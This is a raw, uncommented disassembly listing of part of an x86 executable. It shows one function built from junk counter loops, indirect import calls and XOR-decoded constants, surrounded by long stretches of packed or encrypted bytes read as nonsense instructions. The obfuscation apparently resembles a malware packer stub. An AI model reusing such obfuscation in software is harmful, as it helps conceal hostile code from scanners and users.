  4079cd:	ins    DWORD PTR es:[edi],dx
  4079ce:	pop    ss
  4079cf:	sbb    BYTE PTR [edi],dh
  4079d1:	cwde   
  4079d2:	adc    ebp,DWORD PTR [ecx-0x1f]
  4079d5:	mov    ebp,0x9c5e00ec
  4079da:	mov    esp,0x1c972bd1
  4079df:	pop    esp
  4079e0:	(bad)  
  4079e2:	sub    ecx,edx
  4079e4:	imul   edx,DWORD PTR [esi+edx*8+0x52],0x4d
  4079e9:	jne    0x4079aa
  4079eb:	pop    ds
  4079ec:	add    eax,0x3146487d
  4079f1:	repnz in eax,dx
  4079f3:	lock sub BYTE PTR [edx+0x42],ah
  4079f7:	(bad)  
  4079f9:	sub    BYTE PTR [edi-0x479c4c1d],cl
  4079ff:	fiadd  DWORD PTR [edx+0xa077b58]
  407a05:	dec    ah
  407a07:	sub    BYTE PTR [eax-0x3c],ch
  407a0a:	ffree  st(4)
  407a0c:	cmc    
  407a0d:	lods   eax,DWORD PTR ds:[esi]
  407a0e:	dec    edi
  407a0f:	sbb    eax,0x4366f37b
  407a14:	je     0x407a87
  407a16:	mov    al,ds:0x97a481f6
  407a1b:	in     eax,0xc3
  407a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a1e:	push   es
  407a1f:	add    dl,BYTE PTR [edi]
  407a21:	xlat   BYTE PTR ds:[ebx]
  407a22:	rol    BYTE PTR [esi+edx*1],0x83
  407a26:	int3   
  407a27:	test   BYTE PTR ds:0x35ff8d4f,al
  407a2d:	mov    WORD PTR [ebx+0x35ff0043],fs
  407a33:	push   esp
  407a34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a35:	inc    ebx
  407a36:	add    bh,bh
  407a38:	jne    0x407a12
  407a3a:	push   DWORD PTR [ebp-0x2c]
  407a3d:	mov    eax,DWORD PTR [ebp-0x14]
  407a40:	call   eax
  407a42:	mov    eax,DWORD PTR [ebp-0x30]
  407a45:	mov    ecx,DWORD PTR ds:0x43a350
  407a4b:	add    DWORD PTR [eax],ecx
  407a4d:	pop    edi
  407a4e:	pop    esi
  407a4f:	leave  
  407a50:	ret    
  407a51:	push   ebp
  407a52:	mov    ebp,esp
  407a54:	sub    esp,0x18
  407a57:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  407a5e:	lea    eax,[ebp+0x14]
  407a61:	adc    DWORD PTR ds:0x43501c,ecx
  407a67:	mov    DWORD PTR [ebp-0x4],eax
  407a6a:	adc    ecx,edx
  407a6c:	push   esi
  407a6d:	xor    ecx,0x4b84
  407a73:	mov    esi,0xf89c8585
  407a78:	xor    DWORD PTR ds:0x438014,edx
  407a7e:	mov    DWORD PTR [ebp-0xc],esi
  407a81:	lea    eax,[ebp-0xc]
  407a84:	adc    edx,ecx
  407a86:	mov    DWORD PTR [ebp-0x14],eax
  407a89:	mov    DWORD PTR ds:0x436014,0x1f
  407a93:	cmp    DWORD PTR ds:0x436014,0x0
  407a9a:	je     0x407ae5
  407aa0:	cmp    DWORD PTR ds:0x436014,0x6
  407aa7:	jg     0x407ae5
  407aad:	jmp    0x407abd
  407ab2:	push   0x43a097
  407ab7:	call   DWORD PTR ds:0x43a8d0
  407abd:	cmp    DWORD PTR ds:0x436014,0x7
  407ac4:	jne    0x407ad5
  407aca:	mov    eax,ds:0x436014
  407acf:	dec    eax
  407ad0:	mov    ds:0x436014,eax
  407ad5:	mov    eax,ds:0x436014
  407ada:	dec    eax
  407adb:	mov    ds:0x436014,eax
  407ae0:	jmp    0x407a93
  407ae5:	mov    eax,DWORD PTR [ebp-0xc]
  407ae8:	mov    edx,DWORD PTR [ebp-0x14]
  407aeb:	mov    ecx,0x751089b
  407af0:	xor    eax,ecx
  407af2:	add    eax,0x3272e2
  407af7:	adc    DWORD PTR ds:0x435010,0x438000
  407b01:	mov    DWORD PTR [edx],eax
  407b03:	sub    DWORD PTR ds:0x437008,0x436000
  407b0d:	mov    eax,ds:0x43a14c
  407b12:	sbb    DWORD PTR ds:0x43500c,ebx
  407b18:	mov    edx,DWORD PTR [ebp-0x4]
  407b1b:	or     DWORD PTR ds:0x435010,0x2376
  407b25:	mov    eax,DWORD PTR [eax]
  407b27:	add    DWORD PTR ds:0x434010,0x435010
  407b31:	add    eax,DWORD PTR [edx]
  407b33:	push   edi
  407b34:	mov    DWORD PTR [ebp-0x8],eax
  407b37:	mov    edi,DWORD PTR [ebp+0x8]
  407b3a:	and    DWORD PTR ds:0x438004,0x0
  407b44:	xor    edx,edx
  407b46:	xor    edx,DWORD PTR ds:0x438004
  407b4c:	inc    edx
  407b4d:	mov    DWORD PTR ds:0x438004,edx
  407b53:	cmp    DWORD PTR ds:0x438004,0x20
  407b5a:	jle    0x407b7d
  407b60:	jmp    0x407b70
  407b65:	push   0x43a111
  407b6a:	call   DWORD PTR ds:0x43a8d4
  407b70:	cmp    DWORD PTR ds:0x438004,0x11
  407b77:	jb     0x407b44
  407b7d:	mov    eax,ds:0x43a2d4
  407b82:	mov    eax,DWORD PTR [eax+0x198]
  407b88:	adc    DWORD PTR ds:0x43501c,0x6968
  407b92:	xor    edi,ecx
  407b94:	mov    edx,0x3272e2
  407b99:	add    edi,edx
  407b9b:	mov    DWORD PTR ds:0x434028,0x7d8d
  407ba5:	cmp    DWORD PTR [eax],edi
  407ba7:	mov    DWORD PTR ds:0x43500c,0x2ed0
  407bb1:	je     0x407bd2
  407bb7:	mov    DWORD PTR ds:0x43401c,0x771b
  407bc1:	mov    eax,DWORD PTR [eax]
  407bc3:	mov    DWORD PTR ds:0x434028,0x1ca1
  407bcd:	jmp    0x40a3ac
  407bd2:	mov    eax,DWORD PTR [ebp+0x18]
  407bd5:	cmp    eax,esi
  407bd7:	jne    0x407bf1
  407bdd:	mov    DWORD PTR ds:0x437010,0x6440
  407be7:	push   0xf89c8584
  407bec:	jmp    0x40a39b
  407bf1:	mov    esi,DWORD PTR [ebp+0x18]
  407bf4:	mov    eax,0xf89c85bb
  407bf9:	cmp    esi,eax
  407bfb:	jne    0x40a38b
  407c01:	sub    eax,esi
  407c03:	mov    eax,DWORD PTR [ebp+0x10]
  407c06:	xor    eax,ecx
  407c08:	mov    DWORD PTR ds:0x437008,0x10
  407c12:	cmp    DWORD PTR ds:0x437008,0x0
  407c19:	je     0x407c4c
  407c1f:	cmp    DWORD PTR ds:0x437008,0x12
  407c26:	jl     0x407c4c
  407c2c:	jmp    0x407c3a
  407c31:	push   DWORD PTR [ebp-0x18]
  407c34:	call   DWORD PTR ds:0x43a8dc
  407c3a:	mov    esi,DWORD PTR ds:0x437008
  407c40:	dec    esi
  407c41:	mov    DWORD PTR ds:0x437008,esi
  407c47:	jmp    0x407c12
  407c4c:	add    eax,edx
  407c4e:	and    DWORD PTR ds:0x43501c,0x0
  407c58:	jmp    0x407c6c
  407c5d:	xor    esi,esi
  407c5f:	or     esi,DWORD PTR ds:0x43501c
  407c65:	inc    esi
  407c66:	mov    DWORD PTR ds:0x43501c,esi
  407c6c:	cmp    DWORD PTR ds:0x43501c,0x1f
  407c73:	jae    0x407cc0
  407c79:	cmp    DWORD PTR ds:0x43501c,0x12
  407c80:	jg     0x407cc0
  407c86:	jmp    0x407ca1
  407c8b:	push   0x43a0c9
  407c90:	push   0x779d
  407c95:	push   DWORD PTR [ebp-0x18]
  407c98:	push   DWORD PTR [ebp-0x18]
  407c9b:	call   DWORD PTR ds:0x43a8e0
  407ca1:	cmp    DWORD PTR ds:0x43501c,0x11
  407ca8:	jne    0x407cbb
  407cae:	mov    esi,DWORD PTR ds:0x43501c
  407cb4:	inc    esi
  407cb5:	mov    DWORD PTR ds:0x43501c,esi
  407cbb:	jmp    0x407c5d
  407cc0:	mov    DWORD PTR [ebp-0x18],eax
  407cc3:	and    esi,esi
  407cc5:	mov    eax,DWORD PTR [ebp+0xc]
  407cc8:	mov    esi,DWORD PTR ds:0x437010
  407cce:	or     DWORD PTR ds:0x43600c,esi
  407cd4:	mov    esi,DWORD PTR [ebp-0x8]
  407cd7:	adc    DWORD PTR ds:0x43401c,0x438010
  407ce1:	xor    eax,ecx
  407ce3:	adc    DWORD PTR ds:0x435004,0x436008
  407ced:	add    eax,edx
  407cef:	xor    DWORD PTR ds:0x43501c,0x437018
  407cf9:	imul   eax,DWORD PTR [esi]
  407cfc:	mov    esi,DWORD PTR [ebp+0x8]
  407cff:	and    DWORD PTR ds:0x43700c,0x3cde
  407d09:	xor    esi,ecx
  407d0b:	sbb    DWORD PTR ds:0x437000,0x2ed1
  407d15:	add    esi,edx
  407d17:	mov    DWORD PTR ds:0x436004,0x2911
  407d21:	cmp    esi,eax
  407d23:	mov    eax,DWORD PTR [ebp-0x4]
  407d26:	mov    DWORD PTR ds:0x43501c,0x4044
  407d30:	push   ebx
  407d31:	mov    DWORD PTR ds:0x43600c,0x6dfa
  407d3b:	je     0x407e07
  407d41:	mov    DWORD PTR ds:0x435018,0x18
  407d4b:	cmp    DWORD PTR ds:0x435018,0x0
  407d52:	je     0x407db4
  407d58:	cmp    DWORD PTR ds:0x435018,0x8
  407d5f:	jb     0x407db4
  407d65:	jmp    0x407d88
  407d6a:	push   0x2a76
  407d6f:	push   0x436018
  407d74:	push   DWORD PTR [ebp-0xc]
  407d77:	push   0x43a01f
  407d7c:	push   DWORD PTR [ebp-0x24]
  407d7f:	push   DWORD PTR [ebp-0x24]
  407d82:	call   DWORD PTR ds:0x43a8e4
  407d88:	cmp    DWORD PTR ds:0x435018,0x9
  407d8f:	jne    0x407da2
  407d95:	mov    esi,DWORD PTR ds:0x435018
  407d9b:	dec    esi
  407d9c:	mov    DWORD PTR ds:0x435018,esi
  407da2:	mov    esi,DWORD PTR ds:0x435018
  407da8:	dec    esi
  407da9:	mov    DWORD PTR ds:0x435018,esi
  407daf:	jmp    0x407d4b
  407db4:	mov    esi,DWORD PTR [ebp-0x18]
  407db7:	add    DWORD PTR [eax],esi
  407db9:	mov    eax,DWORD PTR [ebp-0x4]
  407dbc:	mov    esi,DWORD PTR ds:0x43700c
  407dc2:	xor    esi,DWORD PTR ds:0x434008
  407dc8:	mov    DWORD PTR ds:0x43700c,esi
  407dce:	mov    esi,DWORD PTR [ebp+0xc]
  407dd1:	and    DWORD PTR ds:0x436010,0x434018
  407ddb:	xor    esi,ecx
  407ddd:	add    DWORD PTR ds:0x435018,0x43600c
  407de7:	add    esi,edx
  407de9:	xor    DWORD PTR ds:0x437014,0x43801c
  407df3:	imul   esi,DWORD PTR [eax]
  407df6:	mov    DWORD PTR ds:0x436018,0x6d68
  407e00:	mov    DWORD PTR [eax],esi
  407e02:	jmp    0x407e77
  407e07:	mov    DWORD PTR ds:0x435014,0x11
  407e11:	cmp    DWORD PTR ds:0x435014,0x0
  407e18:	je     0x407e72
  407e1e:	cmp    DWORD PTR ds:0x435014,0x6
  407e25:	ja     0x407e72
  407e2b:	jmp    0x407e46
  407e30:	push   DWORD PTR [ebp-0xc]
  407e33:	push   0x2134
  407e38:	push   DWORD PTR [ebp-0x24]
  407e3b:	push   0x8f99
  407e40:	call   DWORD PTR ds:0x43a8e8
  407e46:	cmp    DWORD PTR ds:0x435014,0x7
  407e4d:	jne    0x407e60
  407e53:	mov    ebx,DWORD PTR ds:0x435014
  407e59:	dec    ebx
  407e5a:	mov    DWORD PTR ds:0x435014,ebx
  407e60:	mov    ebx,DWORD PTR ds:0x435014
  407e66:	dec    ebx
  407e67:	mov    DWORD PTR ds:0x435014,ebx
  407e6d:	jmp    0x407e11
  407e72:	mov    esi,DWORD PTR [ebp+0x14]
  407e75:	xor    DWORD PTR [eax],esi
  407e77:	mov    eax,DWORD PTR [ebp-0x4]
  407e7a:	mov    edi,DWORD PTR [ebp+0x10]
  407e7d:	xor    edi,ecx
  407e7f:	mov    esi,0xffcd8d1e
  407e84:	mov    ebx,esi
  407e86:	sub    ebx,edi
  407e88:	add    DWORD PTR [eax],ebx
  407e8a:	mov    eax,DWORD PTR [ebp-0x4]
  407e8d:	mov    edi,DWORD PTR [ebp-0x8]
  407e90:	add    edi,DWORD PTR [eax]
  407e92:	mov    DWORD PTR [ebp-0x8],edi
  407e95:	mov    eax,DWORD PTR [ebp+0xc]
  407e98:	mov    edi,DWORD PTR [ebp+0xc]
  407e9b:	xor    edi,ecx
  407e9d:	xor    eax,ecx
  407e9f:	jmp    0x40a259
  407ea4:	lahf   
  407ea5:	(bad)  
  407ea6:	xchg   esp,eax
  407ea7:	jle    0x407e3d
  407ea9:	emms   
  407eab:	xchg   DWORD PTR [edi],ebp
  407ead:	jmp    0xc645:0x1119c670
  407eb4:	test   eax,0xd17c7c3a
  407eb9:	pop    edi
  407eba:	jl     0x407f38
  407ebc:	dec    ecx
  407ebe:	scas   eax,DWORD PTR es:[edi]
  407ebf:	sub    dl,BYTE PTR [edx-0x192564f8]
  407ec5:	push   ebx
  407ec6:	fmul   st(0),st
  407ec8:	pop    ebx
  407ec9:	jno    0x407ed2
  407ecb:	pop    edx
  407ecc:	cmp    bh,BYTE PTR [ebx+0x5]
  407ecf:	aas    
  407ed0:	jge    0x407ee1
  407ed2:	lds    esi,FWORD PTR ds:[eax-0x50]
  407ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ed7:	cwde   
  407ed8:	aas    
  407ed9:	jnp    0x407ee7
  407edb:	sbb    DWORD PTR [eax],esi
  407edd:	test   eax,0xff17db21
  407ee2:	jno    0x407e79
  407ee4:	adc    al,0xfe
  407ee6:	ret    0x121
  407ee9:	popf   
  407eea:	adc    eax,0xeca62429
  407eef:	ds out dx,al
  407ef1:	add    ecx,esi
  407ef3:	out    dx,eax
  407ef4:	push   0x9ddd485b
  407ef9:	(bad)  
  407efa:	retf   
  407efb:	jp     0x407e94
  407efd:	repnz (bad) 
  407eff:	mov    bl,0x5c
  407f01:	jge    0x407ebd
  407f03:	imul   ebx,DWORD PTR [esi+eax*4],0x3d4cb106
  407f0a:	or     ebx,DWORD PTR [ebx-0x5c0a8707]
  407f10:	xchg   ecx,eax
  407f11:	(bad)  
  407f12:	and    ebx,ebp
  407f14:	xor    DWORD PTR [ecx+ebx*8-0x23],ebp
  407f18:	and    al,0xd
  407f1a:	(bad)  
  407f1b:	adc    dl,BYTE PTR gs:[ebx-0x1f]
  407f1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f20:	lods   al,BYTE PTR ds:[esi]
  407f21:	popf   
  407f22:	lea    edi,[ebx-0xe]
  407f25:	mov    ecx,0x9826c4e3
  407f2a:	sar    BYTE PTR [ecx+ebp*1+0x4d963d2],0xf6
  407f32:	aad    0xe7
  407f34:	xor    ch,cl
  407f36:	(bad)  
  407f37:	dec    DWORD PTR [eax-0x7]
  407f3a:	sbb    DWORD PTR [ebx],esp
  407f3c:	fwait
  407f3d:	xor    ecx,esp
  407f3f:	xor    ebx,0x92f9e0a1
  407f45:	mov    edx,DWORD PTR [edi+esi*8]
  407f48:	arpl   WORD PTR [edx-0x6d71d369],di
  407f4e:	fucomp st(5)
  407f50:	lods   al,BYTE PTR ds:[esi]
  407f51:	xor    DWORD PTR [edx+0x3a],edi
  407f54:	lds    edi,FWORD PTR [ebp+0x3c]
  407f57:	xor    al,bh
  407f59:	out    dx,al
  407f5a:	das    
  407f5b:	mov    ah,0x75
  407f5d:	adc    al,0x9a
  407f5f:	and    DWORD PTR [esi+0x64],edi
  407f62:	adc    BYTE PTR [esi],ah
  407f64:	push   ds
  407f65:	call   0x1b19:0xf806f121
  407f6c:	adc    eax,ecx
  407f6e:	sbb    DWORD PTR [ecx+0x39],esp
  407f71:	cmp    BYTE PTR [eax+0x551d9465],ch
  407f77:	ds scas al,BYTE PTR es:[edi]
  407f79:	outs   dx,BYTE PTR ds:[esi]
  407f7a:	je     0x407fa5
  407f7c:	sub    BYTE PTR [edx+0x3e],0x4a
  407f80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f81:	jnp    0x407f43
  407f83:	mov    ebx,0xd413704a
  407f88:	mov    eax,0xe20e97a
  407f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f8e:	pop    es
  407f8f:	lds    edi,FWORD PTR [eax]
  407f91:	ins    DWORD PTR es:[edi],dx
  407f92:	loop   0x407f45
  407f94:	sbb    eax,0x9a4437f9
  407f99:	das    
  407f9a:	int    0xd1
  407f9c:	or     eax,0x54f4b36d
  407fa1:	cs jp  0x407f34
  407fa4:	xor    al,0xe7
  407fa6:	and    DWORD PTR [ebp-0x2c6be584],esi
  407fac:	fist   DWORD PTR [eax+0x34e0e228]
  407fb2:	test   ebx,eax
  407fb4:	or     DWORD PTR [eax-0x1f57de84],0xffffffee
  407fbb:	cdq    
  407fbc:	and    DWORD PTR [esi+0x2ba9cdd8],0xd545a597
  407fc6:	dec    esp
  407fc7:	(bad)  
  407fc8:	adc    eax,0x21d73006
  407fcd:	mov    al,0xd
  407fcf:	and    ecx,DWORD PTR [ebx-0x29]
  407fd2:	jmp    0x407fe9
  407fd4:	push   0x2e
  407fd6:	cmc    
  407fd7:	push   ebp
  407fd8:	mov    cl,0xa
  407fda:	mov    al,0x6c
  407fdc:	push   cs
  407fdd:	xchg   ebx,eax
  407fde:	push   cs
  407fdf:	daa    
  407fe0:	xchg   bl,al
  407fe2:	aas    
  407fe3:	and    eax,0xfeb72acf
  407fe8:	pusha  
  407fe9:	ss jo  0x407f72
  407fec:	(bad)  
  407fed:	aaa    
  407fee:	and    BYTE PTR [edi+0x44222095],bl
  407ff4:	jmp    0xa1c2:0x7f53ac41
  407ffb:	nop
  407ffc:	lods   al,BYTE PTR ds:[esi]
  407ffd:	jbe    0x407ff6
  407fff:	in     al,0x35
  408001:	loopne 0x407ff9
  408003:	xchg   DWORD PTR [edi-0x63],eax
  408006:	mov    ebp,0x46e36a1c
  40800b:	std    
  40800c:	les    esi,FWORD PTR [edx+esi*2-0x7f15333d]
  408013:	shr    DWORD PTR [edi-0x3f427c19],1
  408019:	nop
  40801a:	aad    0x54
  40801c:	into   
  40801d:	mov    al,ds:0x605c9063
  408022:	sti    
  408023:	xlat   BYTE PTR ds:[ebx]
  408024:	(bad)
  408028:	jmp    0x4e28:0xe1a662e4
  40802f:	into   
  408030:	push   es
  408031:	xor    dh,dh
  408033:	fwait
  408034:	std    
  408035:	pop    ecx
  408036:	xchg   esp,eax
  408037:	and    eax,0x3537d11a
  40803c:	and    ch,BYTE PTR [ecx-0x3e9dbcf6]
  408042:	retf   0xbc10
  408045:	cld    
  408046:	cmc    
  408047:	mov    al,0x74
  408049:	mov    ebx,DWORD PTR [edx-0xf50ea37]
  40804f:	xchg   edi,eax
  408050:	lea    ebp,[ebx+0x1b]
  408053:	mov    ebx,0x35244931
  408058:	jge    0x407ff5
  40805a:	sti    
  40805b:	enter  0xf58d,0x2
  40805f:	ret    0x2c13
  408062:	adc    dh,BYTE PTR [edi-0x27aca54d]
  408068:	(bad)  
  40806a:	lea    ebx,[ecx+0x67fdb537]
  408070:	imul   edx,DWORD PTR [eax],0x37
  408073:	popf   
  408074:	mov    cl,0xfb
  408076:	xor    ah,cl
  408078:	lds    eax,FWORD PTR [ecx+0x5ab4f964]
  40807e:	or     esi,edi
  408080:	inc    edx
  408081:	push   0x8ef64212
  408086:	push   esi
  408087:	jmp    0x6208f32a
  40808c:	adc    BYTE PTR [esp+ecx*2-0x70],0xe1
  408091:	mov    dl,0x24
  408093:	ds xchg edi,eax
  408095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408096:	add    al,BYTE PTR [ecx-0x12c0d6f0]
  40809c:	pop    ebx
  40809d:	les    esp,FWORD PTR [ebp-0x162f9f22]
  4080a3:	pop    ebx
  4080a4:	into   
  4080a5:	jns    0x408114
  4080a7:	ror    BYTE PTR [ebx+0x7e],1
  4080aa:	out    dx,al
  4080ab:	pop    ebx
  4080ac:	adc    DWORD PTR [ebx+0x2583f70c],edi
  4080b2:	ins    DWORD PTR es:[edi],dx
  4080b3:	dec    esp
  4080b4:	arpl   WORD PTR [edx],ax
  4080b6:	int3   
  4080b7:	xor    dh,BYTE PTR [ebx+0x21318f82]
  4080bd:	mov    esp,0xc86a69e6
  4080c2:	mov    edx,0x5e9a36e9
  4080c7:	test   eax,0xc99620c5
  4080cc:	scas   eax,DWORD PTR es:[edi]
  4080cd:	(bad)  
  4080ce:	scas   al,BYTE PTR es:[edi]
  4080cf:	mov    ds:0x3133899a,eax
  4080d4:	adc    BYTE PTR [eax-0x7d],0x12
  4080d8:	rol    DWORD PTR [edi-0x10f3303d],cl
  4080de:	dec    edx
  4080df:	bnd jbe 0x408089
  4080e2:	test   BYTE PTR [ebp-0x5e34b663],al
  4080e8:	push   edi
  4080e9:	or     eax,0x45167ec2
  4080ee:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4080f0:	push   cs
  4080f1:	mov    esp,0xb8f018ac
  4080f6:	inc    ecx
  4080f7:	lock push esi
  4080f9:	out    dx,al
  4080fa:	gs aad 0xa4
  4080fd:	add    BYTE PTR [eax+0x1db7a638],bh
  408103:	scas   al,BYTE PTR es:[edi]
  408104:	clc    
  408105:	xchg   DWORD PTR [ebx],edi
  408107:	(bad)  
  408108:	(bad)  
  408109:	scas   al,BYTE PTR es:[edi]
  40810a:	jecxz  0x4080ac
  40810c:	mov    BYTE PTR [esi+eax*1-0x40],dl
  408110:	data16 jno 0x4080d3
  408113:	int3   
  408114:	shl    BYTE PTR [eax],cl
  408116:	inc    edx
  408117:	ins    DWORD PTR es:[edi],dx
  408118:	push   edi
  408119:	xor    dl,dh
  40811b:	shl    DWORD PTR [ebp+0x30565d8c],1
  408121:	cmp    al,0x34
  408123:	jo     0x408182
  408125:	xchg   edi,eax
  408126:	dec    ecx
  408127:	or     ebp,DWORD PTR [eax+0x7156b98a]
  40812d:	test   DWORD PTR [ebp+0x37],eax
  408130:	ret    
  408131:	fiadd  DWORD PTR [edi]
  408133:	sbb    ch,cl
  408135:	xchg   ebp,eax
  408136:	jne    0x408161
  408138:	jmp    0xfef8:0x47395db8
  40813f:	in     eax,0x1d
  408141:	or     DWORD PTR [eax-0x2ff92258],ecx
  408147:	mov    eax,0x2014497f
  40814c:	push   cs
  40814d:	pop    ds
  40814e:	ret    0x5166
  408151:	fst    DWORD PTR [edx+ecx*2+0x1c]
  408155:	(bad)  
  408156:	repnz mov ecx,0xcf2d603
  40815c:	pop    ecx
  40815d:	sahf   
  40815e:	shl    DWORD PTR [esi],0xf6
  408161:	pop    esp
  408162:	xlat   BYTE PTR ds:[ebx]
  408163:	aad    0xf8
  408165:	in     eax,dx
  408166:	xchg   ebp,eax
  408167:	loope  0x4081c7
  408169:	jp     0x40816d
  40816b:	push   ecx
  40816c:	dec    ebx
  40816d:	dec    ecx
  40816e:	mov    dh,0xdb
  408170:	cmp    DWORD PTR [edi],ebp
  408172:	(bad)  
  408174:	xor    al,0xab
  408176:	mov    bh,0x81
  408178:	cs xor al,0xf4
  40817b:	pop    ss
  40817c:	jmp    0x75871100
  408181:	jmp    0xc3ea0fef
  408186:	or     bl,BYTE PTR [edx+0x27]
  408189:	xor    eax,0x8d577c92
  40818e:	fidivr WORD PTR cs:[esi-0x2a188b73]
  408195:	icebp  
  408196:	inc    edx
  408197:	les    esi,FWORD PTR [esp+eiz*2]
  40819a:	cdq    
  40819b:	xchg   edx,eax
  40819c:	call   0x600:0x45915c54
  4081a3:	aad    0x76
  4081a5:	lods   eax,DWORD PTR ds:[esi]
  4081a6:	mov    eax,0x255ad42
  4081ab:	fucom  st(0)
  4081ad:	push   edx
  4081ae:	sbb    DWORD PTR [edi+0x55fa052f],ecx
  4081b4:	jbe    0x4081af
  4081b6:	fisub  DWORD PTR [ecx-0x3b]
  4081b9:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081bb:	sahf   
  4081bc:	push   eax
  4081bd:	mov    eax,0xfa34a9bd
  4081c2:	or     eax,0xaf2e7aa
  4081c7:	inc    ebx
  4081c8:	xor    eax,0x594a5c53
  4081cd:	dec    edi
  4081ce:	cs mov ebp,0x1d3d5572
  4081d4:	sbb    esp,edx
  4081d6:	cs das 
  4081d8:	repnz jecxz 0x408193
  4081db:	pop    esp
  4081dc:	mov    bl,0x48
  4081de:	push   edx
  4081df:	repnz sti 
  4081e1:	mov    ecx,0x22659667
  4081e6:	xchg   ebp,eax
  4081e7:	iret   
  4081e8:	(bad)  
  4081e9:	lea    ebp,[eax-0xd]
  4081ec:	ret    
  4081ed:	or     cl,BYTE PTR [ebp-0x4720f8ab]
  4081f3:	jle    0x40820f
  4081f5:	out    dx,eax
  4081f6:	lahf   
  4081f7:	test   eax,0xb7ad9b01
  4081fc:	outs   dx,DWORD PTR ds:[esi]
  4081fd:	xchg   esi,eax
  4081fe:	jecxz  0x408200
  408200:	fbld   TBYTE PTR [esi+0x3077fafb]
  408206:	sub    ch,BYTE PTR [ebp+0x1409ae57]
  40820c:	fcmovu st,st(7)
  40820e:	pop    es
  40820f:	dec    edi
  408210:	xlat   BYTE PTR ds:[ebx]
  408211:	mov    ah,0xdb
  408213:	mov    cl,BYTE PTR [ebx]
  408215:	imul   ebp,esp,0x9c839578
  40821b:	mov    edi,0x829cfd1d
  408220:	out    dx,eax
  408221:	adc    DWORD PTR [edx-0x4391ea01],ebx
  408227:	push   0x48
  408229:	ror    ebp,cl
  40822b:	out    dx,eax
  40822c:	mov    ch,0xab
  40822e:	mov    ch,0xec
  408230:	inc    ebp
  408231:	push   es
  408232:	xchg   ebp,ebx
  408234:	std    
  408235:	push   edi
  408236:	xchg   ebp,eax
  408237:	sti    
  408238:	sbb    edi,DWORD PTR [ebp+esi*4+0x32]
  40823c:	dec    ebp
  40823d:	or     eax,0x1d08f87
  408242:	dec    edi
  408243:	sub    al,0x45
  408245:	and    al,0xc0
  408247:	mov    ds:0x338543a4,eax
  40824c:	aaa    
  40824d:	cdq    
  40824e:	movzx  ecx,BYTE PTR [esp+eax*4-0x71]
  408253:	shl    BYTE PTR ds:0xe54dd5e4,1
  408259:	sti    
  40825a:	ins    DWORD PTR es:[edi],dx
  40825b:	ins    DWORD PTR es:[edi],dx
  40825c:	cmp    edx,DWORD PTR [ebx]
  40825e:	dec    eax
  40825f:	shl    BYTE PTR [edi-0x2baa9eaa],1
  408265:	xor    BYTE PTR [edi+0x5],dl
  408268:	dec    ecx
  408269:	out    0x21,al
  40826b:	push   0xffffffab
  40826d:	(bad)  
  40826f:	push   0x2ba07f6d
  408274:	test   DWORD PTR [edx],esp
  408276:	ret    0x3fbc
  408279:	(bad)  
  40827a:	in     al,0x50
  40827c:	fstp   DWORD PTR [esi]
  40827e:	xchg   ecx,eax
  40827f:	dec    esi
  408280:	fidiv  WORD PTR [esi-0x42]
  408283:	sbb    DWORD PTR [eax+edx*1+0x38],eax
  408287:	rcl    DWORD PTR [eax],1
  408289:	add    DWORD PTR [edi],esp
  40828b:	mov    edx,0x814ea9e2
  408290:	mov    esi,0x6e582085
  408295:	out    0x45,eax
  408297:	ss jecxz 0x408293
  40829a:	mov    BYTE PTR [edi+0x2caf5596],cl
  4082a0:	and    DWORD PTR [ecx+edi*4-0x75b6396c],0xeacffa0
  4082ab:	sbb    al,0xe3
  4082ad:	push   ss
  4082ae:	sub    DWORD PTR ds:[ebx+0x1e],0x70
  4082b3:	xchg   esp,eax
  4082b4:	jp     0x4082e5
  4082b6:	pop    es
  4082b7:	and    cl,BYTE PTR [ebp+0x26]
  4082ba:	aas    
  4082bb:	add    edi,esp
  4082bd:	(bad)
  4082c0:	in     al,0x2e
  4082c2:	je     0x408301
  4082c4:	xchg   esi,eax
  4082c5:	jno    0x408260
  4082c7:	xchg   esp,eax
  4082c8:	sub    BYTE PTR [edi],cl
  4082ca:	or     eax,0xb46960f2
  4082cf:	mov    ds:0xdabab03c,eax
  4082d4:	scas   al,BYTE PTR es:[edi]
  4082d5:	lods   al,BYTE PTR ds:[esi]
  4082d6:	xchg   ebp,eax
  4082d7:	bound  edi,QWORD PTR [esi]
  4082d9:	pop    ss
  4082da:	(bad)  [esi]
  4082dc:	jo     0x408261
  4082de:	sbb    eax,DWORD PTR gs:[ecx]
  4082e1:	ss mov dh,0xda
  4082e4:	outs   dx,BYTE PTR ds:[esi]
  4082e5:	and    bh,BYTE PTR [ebp+0x4978a653]
  4082eb:	inc    eax
  4082ec:	retf   
  4082ed:	stos   DWORD PTR es:[edi],eax
  4082ee:	xor    edi,DWORD PTR [eax+0x5ea3394d]
  4082f4:	push   cs
  4082f5:	loope  0x408301
  4082f7:	cwde   
  4082f8:	push   ds
  4082f9:	xchg   DWORD PTR [ecx+0x29],esp
  4082fc:	push   ebp
  4082fd:	shr    BYTE PTR [edx],0x7a
  408300:	mov    esp,es
  408302:	leave  
  408303:	pop    ss
  408304:	(bad)  
  408305:	cwde   
  408306:	pop    esi
  408307:	dec    eax
  408308:	ja     0x408329
  40830a:	add    DWORD PTR [edi-0x355b54a1],esi
  408310:	in     eax,dx
  408311:	cmp    esi,esi
  408313:	sbb    BYTE PTR [esi],ah
  408315:	je     0x4082bb
  408317:	ret    
  408318:	je     0x4082f9
  40831a:	pop    ecx
  40831b:	sbb    eax,0x943b8dc9
  408320:	pushf  
  408321:	adc    eax,0x57ba172
  408326:	iret   
  408327:	retf   
  408328:	or     al,0xd0
  40832a:	ds push es
  40832c:	adc    BYTE PTR [esi],dl
  40832e:	dec    edi
  40832f:	das    
  408330:	dec    edi
  408331:	sub    DWORD PTR [edi],edx
  408333:	out    dx,eax
  408334:	xchg   ebx,eax
  408335:	(bad)  
  408336:	jno    0x408364
  408338:	xchg   ebp,esi
  40833a:	shl    dl,0xc0
  40833d:	lods   eax,DWORD PTR ds:[esi]
  40833e:	js     0x4082e4
  408340:	and    eax,0xe342b06
